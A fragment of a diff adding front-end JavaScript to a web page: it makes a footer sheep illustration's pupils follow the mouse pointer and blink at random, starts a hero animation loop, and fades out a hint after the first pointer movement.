+
+/* ---------- the footer sheep keeps an eye on you ---------- */
+{
+  const peek = $("#peek"), pl = $("#pl"), pr = $("#pr");
+  addEventListener("pointermove", (e) => {
+    const r = peek.getBoundingClientRect();
+    if (r.top > innerHeight + 200) return;
+    const cx = r.left + r.width * .52, cy = r.top + r.height * .66;
+    let dx = e.clientX - cx, dy = e.clientY - cy;
+    const a = 8 * Math.PI / 180, rx = dx * Math.cos(a) - dy * Math.sin(a), ry = dx * Math.sin(a) + dy * Math.cos(a);
+    const d = Math.hypot(rx, ry) || 1, k = Math.min(9, d / 30);
+    const ox = rx / d * k, oy = ry / d * k;
+    pl.setAttribute("cx", 294 + ox); pl.setAttribute("cy", 712 + oy);
+    pr.setAttribute("cx", 368 + ox); pr.setAttribute("cy", 712 + oy);
+  }, { passive: true });
+  if (!reduced) (async () => { for (;;) { await sleep(2500 + Math.random() * 4000); $$("#peek .lid").forEach((l) => (l.style.transform = "scaleY(.1)")); await sleep(120); $$("#peek .lid").forEach((l) => (l.style.transform = "")); } })();
+}
+
+/* ---------- go ---------- */
+heroLoop();
+let hinted = false;
+addEventListener("pointermove", () => { if (!hinted) { hinted = true; setTimeout(() => ($("#hint").style.opacity = 0), 6000); } }, { once: true, passive: true });
 })();
 </script>
 </body>
